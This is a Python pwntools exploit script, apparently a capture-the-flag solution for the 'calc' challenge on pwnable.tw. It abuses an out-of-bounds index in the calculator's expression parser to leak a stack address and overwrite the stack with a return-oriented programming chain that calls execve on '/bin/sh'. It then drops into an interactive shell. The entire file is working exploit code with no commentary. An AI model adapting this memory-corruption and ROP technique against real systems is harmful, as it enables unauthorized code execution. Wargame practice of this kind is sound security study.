#!/usr/bin/env python

from pwn import *
import numpy as np

r = remote('chall.pwnable.tw', 10100)

# r = process('./calc')

gadget = [0x805c34b, 11, 0x80701aa, 0, 0x80701d1, 0, 1, 0x8049a21, 0x6e69622f, 0x68732f]

r.recv()

r.send('+360\n')
main_ebp = int(r.recvline())
bottom_main_stack_addr = main_ebp&0xfffffff0 - 16

binsh_addr = (bottom_main_stack_addr) + (7*4)
gadget[6] = binsh_addr

for i in range(0, 10):
    r.send('+' + str(i+361) + '\n')
   
    origin_var = int(r.recvline())
    diff = np.int32(gadget[i]) - np.int32(origin_var)

    if diff < 0:
        r.send('+' + str(i+361) + str(diff) + '\n')
    else:
        r.send('+' + str(i+361) + '+' + str(diff) + '\n')

    str2 = r.recvline()

r.sendline()
r.interactive()
